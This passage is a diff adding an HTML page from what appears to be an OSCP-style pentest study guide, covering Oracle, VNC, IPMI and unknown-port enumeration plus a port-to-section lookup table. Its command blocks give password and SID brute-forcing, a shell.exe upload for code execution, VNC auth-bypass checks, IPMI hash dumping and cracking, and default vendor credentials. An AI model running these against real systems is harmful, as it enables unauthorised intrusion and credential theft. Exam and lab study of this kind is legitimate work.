+nmap -p1521 -sV --script &quot;oracle-tns-version,oracle-sid-brute&quot; $IP   # version + guess the SID
+odat sidguesser -s $IP -p 1521                     # brute-force the SID (the database name)
+odat passwordguesser -s $IP -p 1521 -d &lt;SID&gt;       # guess default username/passwords for that SID
+tnscmd10g version -h $IP                            # query the TNS listener directly
+sqlplus &lt;user&gt;/&lt;pass&gt;@$IP:1521/&lt;SID&gt;               # log in once you have creds
+odat utlfile -s $IP -d &lt;SID&gt; -U &lt;user&gt; -P &lt;pass&gt; --putFile C:\\ shell.exe local.exe   # upload a file (→ RCE)</code></pre>
+<p><strong>Where it leads:</strong> with creds → file read/write and command execution as the Oracle service account (often high-priv on Windows → SeImpersonate → SYSTEM). Default creds are the usual foothold.</p>
+<h2 id="v3-[enum-vnc]-port-5900-vnc-remote-desktop">[ENUM-VNC]  Port 5900(+) — VNC (remote desktop)<a class="anchor" href="#v3-[enum-vnc]-port-5900-vnc-remote-desktop">#</a></h2>
+<p><strong>What it is:</strong> a graphical remote-desktop service (like RDP, cross-platform). Some versions have an auth-bypass; weak/blank passwords are common; a found password often unlocks a desktop already logged in as a privileged user.</p>
+<pre><code>nmap -p5900 --script &quot;vnc-info,realvnc-auth-bypass,vnc-title&quot; $IP   # info + CVE-2006-2369 auth bypass check
+vncviewer $IP                                       # connect (prompts for the VNC password)
+vncviewer $IP -passwd /path/to/vnc.passwd           # use a captured .vnc password file
+# crack a captured VNC password file:  vncpwd vnc.passwd   (or the &#x27;vncdec&#x27; tools)
+hydra -P rockyou.txt vnc://$IP                       # brute the password (last resort)</code></pre>
+<p><strong>Where it leads:</strong> a graphical session (often as an already-logged-in, sometimes admin, user).</p>
+<h2 id="v3-[enum-ipmi]-port-623udp-ipmi-server-management">[ENUM-IPMI]  Port 623/UDP — IPMI (server management)<a class="anchor" href="#v3-[enum-ipmi]-port-623udp-ipmi-server-management">#</a></h2>
+<p><strong>What it is:</strong> a &quot;lights-out&quot; management interface on server hardware. Its big weakness: <strong>IPMI 2.0 will hand you a password hash for any valid user before you even authenticate</strong> (CVE-2013-4786) → crack it offline.</p>
+<pre><code>nmap -sU -p623 --script ipmi-version,ipmi-cipher-zero $IP     # detect + check for the cipher-zero auth bypass
+# dump password hashes (Metasploit — your ONE MSF box, or just to grab the hash):
+#   use auxiliary/scanner/ipmi/ipmi_dumphashes    → gives a hashcat -m 7300 (RAKP) hash
+hashcat -m 7300 ipmi.hash rockyou.txt                # crack the captured RAKP hash
+# default creds to try: ADMIN/ADMIN, root/calvin (Dell), admin/admin</code></pre>
+<p><strong>Where it leads:</strong> admin creds for the server&#x27;s management controller (→ often the OS).</p>
+<h2 id="v3-[enum-unusual-ports]-a-generic-method-for-any-port-you-dont-recognise">[ENUM-UNUSUAL-PORTS]  a generic method for any port you don&#x27;t recognise<a class="anchor" href="#v3-[enum-unusual-ports]-a-generic-method-for-any-port-you-dont-recognise">#</a></h2>
+<p>When you meet an unknown port, work through these:</p>
+<ol>
+<li><code>nc -nv $IP &lt;port&gt;</code> → grab the banner; try sending a newline, then <code>HELP</code>, then <code>GET / HTTP/1.0</code>.</li>
+<li><code>nmap -p&lt;port&gt; -sCV --version-intensity 9 $IP</code> → force harder version detection.</li>
+<li>Google the banner/version text + &quot;exploit&quot; or &quot;default credentials&quot;.</li>
+<li>Try it as web (<code>curl</code>), then as TLS (<code>openssl s_client -connect $IP:&lt;port&gt;</code>), then with the service&#x27;s own client.</li>
+<li><code>searchsploit &lt;product&gt;</code>. <strong>Treat every listening port as a possible way in.</strong></li>
+</ol>
+<hr>
+<h1 id="v3-[enum-decision]-port-x-is-open-go-read-this-section">[ENUM-DECISION]  &quot;Port X is open → go read this section&quot;<a class="anchor" href="#v3-[enum-decision]-port-x-is-open-go-read-this-section">#</a></h1>
+<p>Use your Nmap results, then jump (Ctrl+F the tag):</p>
+<pre><code>21  FTP        → [ENUM-FTP]      (anonymous? can you upload? version exploit?)
+22  SSH        → [ENUM-SSH]      (have creds/keys? otherwise it&#x27;s a payoff, not a way in)
+25  SMTP       → [ENUM-SMTP]     (enumerate usernames)
+53  DNS        → [ENUM-DNS]      (zone transfer, AD SRV records)
+80/443/8080…   → [WEB-QUICK]     (Volume 2 — always enumerate web fully)
+88  KERBEROS   → it&#x27;s AD! → [AD-QUICK] + [ENUM-KERBEROS]
+110/143 POP/IMAP → test creds, loot mailboxes
+111 RPC        → showmount → NFS → [ENUM-NFS]
+135 MSRPC      → rpcclient user enum → [ENUM-RPC]
+139/445 SMB    → [ENUM-SMB] / [SMB-QUICK]
+161 SNMP       → snmpwalk → [ENUM-SNMP]
+389/636/3268 LDAP → [ENUM-LDAP] + [AD-ENUM]
+623 IPMI       → [ENUM-IPMI]  (UDP — dump the hash)
+1433 MSSQL     → [ENUM-MSSQL]
+1521 Oracle    → [ENUM-ORACLE]
+2049 NFS       → [ENUM-NFS]
+3306 MySQL     → [ENUM-MYSQL]
+3389 RDP       → [ENUM-RDP]
+5432 Postgres  → [ENUM-POSTGRES]
+5900 VNC       → [ENUM-VNC]
+5985/5986 WinRM → [ENUM-WINRM]
+6379 Redis     → [ENUM-REDIS]
+27017 Mongo    → [ENUM-MONGODB]
+2375 Docker    → [ENUM-DOCKER]
+anything else  → [ENUM-UNUSUAL-PORTS]</code></pre>
+<hr>
+<p>*End Volume 1. Next: Volume 2 (Web &amp; SQL Injection) — how to break the websites you just found.*</p></section></main>
+  </div>
+</div>
+<button id="totop" onclick="window.scrollTo({top:0,behavior:'smooth'})" title="Top">↑</button>
+<script>
+function toggleTheme(){var h=document.documentElement,t=h.getAttribute('data-theme')==='dark'?'light':'dark';h.setAttribute('data-theme',t);try{localStorage.setItem('oscpkb-theme',t)}catch(e){}}
+try{var s=localStorage.getItem('oscpkb-theme');if(s)document.documentElement.setAttribute('data-theme',s)}catch(e){}
+var content=document.getElementById('content'),searchBox=document.getElementById('search'),countEl=document.getElementById('count');
+var marks=[],cur=-1;
+function clearMarks(){marks.forEach(function(m){var p=m.parentNode;p.replaceChild(document.createTextNode(m.textContent),m);p.normalize();});marks=[];cur=-1;countEl.textContent='';}
+function clearSearch(){searchBox.value='';clearMarks();searchBox.focus();}
+function doSearch(){clearMarks();var q=searchBox.value.trim();if(q.length<2)return;var rx=new RegExp(q.replace(/[.*+?^${}()|[\]\\]/g,'\\$&'),'gi');var wk=document.createTreeWalker(content,NodeFilter.SHOW_TEXT,{acceptNode:function(n){if(!n.nodeValue.trim())return NodeFilter.FILTER_REJECT;var t=n.parentNode.tagName;if(t==='SCRIPT'||t==='STYLE')return NodeFilter.FILTER_REJECT;return rx.test(n.nodeValue)?NodeFilter.FILTER_ACCEPT:NodeFilter.FILTER_REJECT;}});var tg=[],node;while(node=wk.nextNode())tg.push(node);tg.forEach(function(n){rx.lastIndex=0;var frag=document.createDocumentFragment(),last=0,s=n.nodeValue,m;while(m=rx.exec(s)){if(m.index>last)frag.appendChild(document.createTextNode(s.slice(last,m.index)));var mk=document.createElement('mark');mk.textContent=m[0];frag.appendChild(mk);marks.push(mk);last=m.index+m[0].length;if(m.index===rx.lastIndex)rx.lastIndex++;}if(last<s.length)frag.appendChild(document.createTextNode(s.slice(last)));n.parentNode.replaceChild(frag,n);});countEl.textContent=marks.length?('0/'+marks.length):'0 hits';if(marks.length){cur=-1;jump(1);}}
+function jump(d){if(!marks.length)return;if(cur>=0)marks[cur].classList.remove('current');cur=(cur+d+marks.length)%marks.length;var m=marks[cur];m.classList.add('current');m.scrollIntoView({behavior:'smooth',block:'center'});countEl.textContent=(cur+1)+'/'+marks.length;}
+var deb;searchBox.addEventListener('input',function(){clearTimeout(deb);deb=setTimeout(doSearch,180);});
+searchBox.addEventListener('keydown',function(e){if(e.key==='Enter'){e.preventDefault();jump(e.shiftKey?-1:1);}if(e.key==='Escape'){clearSearch();}});
+document.addEventListener('keydown',function(e){if(e.key==='/'&&document.activeElement!==searchBox&&(document.activeElement.id!=='navfilter')){e.preventDefault();searchBox.focus();}});
+content.addEventListener('click',function(e){if(e.target.classList.contains('tag')){searchBox.value=e.target.textContent;doSearch();}});
+var nf=document.getElementById('navfilter');nf.addEventListener('input',function(){var q=this.value.toLowerCase();document.querySelectorAll('#nav .navlink').forEach(function(a){a.style.display=(!q||a.textContent.toLowerCase().indexOf(q)>=0)?'':'none';});});
+var totop=document.getElementById('totop');window.addEventListener('scroll',function(){totop.style.display=window.scrollY>500?'block':'none';});
+document.getElementById('nav').addEventListener('click',function(e){if(e.target.classList.contains('navlink')&&window.innerWidth<=900)document.getElementById('sidebar').classList.remove('open');});
+</script>
+</body>
+</html>
